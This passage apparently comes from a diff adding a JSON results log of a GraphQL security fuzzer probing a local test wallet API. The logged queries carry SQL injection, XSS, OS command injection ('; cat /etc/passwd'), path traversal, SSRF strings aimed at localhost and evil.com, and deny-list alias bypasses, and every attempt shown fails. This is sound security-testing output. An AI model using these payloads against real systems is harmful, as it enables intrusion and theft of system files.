+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery bypassingQueryDeny {\n  myWallet: getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T16:54:26.924344Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:54:26.929905Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 30,
+    "timestamp": "2025-10-05T16:54:26.929942Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.03,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.015,
+    "timestamp": "2025-10-05T16:54:29.280439Z",
+    "count": 31,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    naame\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:54:31.288812Z",
+    "count": 32,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Wallet\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:54:37.500862Z",
+    "count": 33,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123' OR '1'='1\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.004,
+    "timestamp": "2025-10-05T16:54:39.193059Z",
+    "count": 34,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\\\"><script>alert('XSS')</script>\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.031,
+    "timestamp": "2025-10-05T16:54:42.047439Z",
+    "count": 35,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\n# Assuming 'walletID' might be used in some backend URL construction or file access.\n# This injection attempts to point to a local resource or a different external service.\nquery {\n  getWallet(walletID: \"wallet123&url=http://127.0.0.1:8080/admin\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:54:44.946366Z",
+    "count": 36,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\n# This assumes the walletID might be passed to a shell command, e.g., 'cat /wallets/wallet123.json'.\n# The injection attempts to execute an arbitrary command.\nquery {\n  getWallet(walletID: \"wallet123; cat /etc/passwd\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:54:46.551212Z",
+    "count": 37,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\n# This injection tries to access a different file outside the intended directory.\n# Assuming the system handles walletID as part of a file path.\nquery {\n  getWallet(walletID: \"../../../etc/passwd\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:54:48.066670Z",
+    "count": 38,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\n# Similar to XSS, but targeting a rendering context where HTML is directly interpreted,\n# potentially leading to UI defacement or information disclosure if not properly sanitized.\nquery {\n  getWallet(walletID: \"wallet123<h1>Hello HTML Injection!</h1>\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:54:50.565271Z",
+    "count": 39,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet456\") {\n    id\n    name\n    currency {\n      abbreviation\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.006,
+        "timestamp": "2025-10-05T16:54:53.448168Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:54:53.453672Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 40,
+    "timestamp": "2025-10-05T16:54:53.453719Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  myWallet: getWallet(walletID: \"wallet456\") {\n    id\n    name\n    currency {\n      abbreviation\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.011,
+        "timestamp": "2025-10-05T16:54:55.600302Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T16:54:55.607932Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 41,
+    "timestamp": "2025-10-05T16:54:55.607962Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.005,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n      description\n      fields {\n        name\n        type {\n          name\n          kind\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:54:57.246311Z",
+    "count": 42,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet789\") {\n    id\n    naamee # Intentional typo to trigger a suggestion for 'name'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:54:59.712843Z",
+    "count": 43,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naamee\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naamee\" on type \"Wallet\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.004,
+    "timestamp": "2025-10-05T16:55:04.254140Z",
+    "count": 44,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123' OR 1=1 --\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:55:06.829763Z",
+    "count": 45,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:55:08.443103Z",
+    "count": 46,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123; URL=http://evil.com/data\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:55:10.022188Z",
+    "count": 47,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123; cat /etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:55:11.865305Z",
+    "count": 48,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123/../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:55:13.781324Z",
+    "count": 49,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123 <img src='x' onerror='alert(\\\"HTMLi\\\")'>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-05T16:55:15.627178Z",
+    "count": 50,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.009,
+        "timestamp": "2025-10-05T16:55:17.948624Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T16:55:17.955243Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 51,
+    "timestamp": "2025-10-05T16:55:17.955304Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.006,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  myWallet: getWallet(walletID: \"wallet123\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.011,
+        "timestamp": "2025-10-05T16:55:19.902309Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:55:19.907363Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 52,
+    "timestamp": "2025-10-05T16:55:19.907378Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
